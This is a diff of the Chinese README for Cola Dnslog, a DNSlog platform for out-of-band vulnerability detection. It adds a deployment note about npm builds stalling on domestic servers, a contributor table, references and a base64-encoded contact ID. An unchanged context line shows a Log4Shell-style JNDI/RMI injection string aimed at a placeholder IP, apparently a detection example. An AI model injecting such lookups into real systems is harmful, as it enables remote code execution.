@@ -60,6 +60,10 @@ Cola Dnslog 是一款更加强大的dnslog平台（无回显漏洞探测辅助�
 
 ### 安装部署
 
+> 因为一些国内网络众所周知的原因，大多数同学使用国内VPS都会卡在前端npm构建的时候，目前暂未找到更好的解决方案，建议使用国外或者网络畅通的VPS搭建。
+>
+> 欢迎大家提issues!
+
 #### Docker（推荐）
 
 ##### 一键启动（推荐）
@@ -431,16 +435,26 @@ ${jndi:rmi://1.1.1.1:1099/rmiqrq}
 
 Cola Dnslog 现已加入 [404星链计划](https://github.com/knownsec/404StarLink)
 
-
 ## 💦 其他
 
-参考：
+### 🎖 他们也出力了！
+
+<table>
+  <tr>
+    <td align="center"><a href="https://github.com/Weik1"><img src="https://avatars.githubusercontent.com/u/34065927?v=4" width="100px;" alt=""/><br /><sub><b>Weik1
+</b></sub></a><br />🐡
+  </tr>
+<table>
+
+### 🎉 参考
 
 - https://panjiachen.github.io/vue-element-admin-site/zh/
 - [https://github.com/NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper)
 - https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/faq.html#netcontact
 - http://www.hackdig.com/02/hack-596460.htm
 - 太多了没法一一列出......................
+
+### ☕️ buy me a coffee 3q
 
 师傅们可以加我wx，一起交流进步`RG9nZ3lDaGVuZwo=`
 
